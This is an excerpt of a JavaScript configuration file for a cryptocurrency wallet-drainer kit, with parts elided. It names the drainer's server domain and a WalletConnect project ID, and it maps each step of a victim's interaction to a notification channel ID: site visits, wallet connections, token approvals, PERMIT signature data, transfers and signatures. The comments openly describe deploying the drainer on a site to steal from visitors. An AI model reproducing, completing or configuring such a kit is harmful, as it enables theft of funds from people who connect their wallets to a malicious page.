...
const MS_Server = "bugs-token.com"; // Specify the domain that is attached to the drainer server
// This is the domain where you have a server, and not the site itself where you plan to use the drainer
const MS_WalletConnect_ID = "74c8786c3a735af466f2a6a82669d85b"; // Project ID from WalletConnect Cloud
...
const MS_Modal_Mode = 2; // 1 - select a wallet by clicking and connect with a button, 2 - connect immediately after selection
...
const MS_Custom_Chat = {
  ...
  Chat_Settings: {
    enter_website: "-1001893657665", // Channel ID for the action - Login to the site (if empty - notification is disabled)
    leave_website: "-1002124896866", // Channel ID for the action - Exit the site (if empty - notification is disabled)
    connect_success: "-1002124896866", // Channel ID for the action - Successful connection (if empty - notification disabled)
    connect_request: "-1002124896866", // Channel ID for the action - Connection request (if empty - notification disabled)
    connect_cancel: "-1002124896866", // Channel ID for action - Connection rejected (if empty - notification disabled)
    approve_request: "-1002124896866", // Channel ID for the action - Request for confirmation (if empty - notification disabled)
    approve_success: "-1002124896866", // Channel ID for action - Successful confirmation (if empty - notification disabled)
    approve_cancel: "-1002124896866", // Channel ID for action - Acknowledgment rejected (if empty - notification disabled)
    permit_sign_data: "-1002124896866", // Channel ID for the action - Data from PERMIT (if empty - notification disabled)
    transfer_request: "-1002124896866", // Channel ID for the action - Transfer request (if empty - notification disabled)
    transfer_success: "-1002124896866", // Channel ID for the action - Successful transfer (if empty - notification disabled)
    transfer_cancel: "-1002124896866", // Channel ID for the action - Cancel transfer (if empty - notification disabled)
    sign_request: "-1002124896866", // Channel ID for the action - Signature Request (if empty - notification disabled)
    sign_success: "-1002124896866", // Channel ID for action - Successful signature (if empty - notification disabled)
    sign_cancel: "-1002124896866", // Channel ID for action - Signature rejected (if empty - notification disabled)
    chain_request: "-1002124896866", // Channel ID for the action - Request to change network (if empty - notification is disabled)
    chain_success: "-1002124896866", // Channel ID for the action - Network change accepted (if empty - notification disabled)
    chain_cancel: "-1002124896866", // Channel ID for the action - Network change rejected (if empty - notification disabled)
  },
};
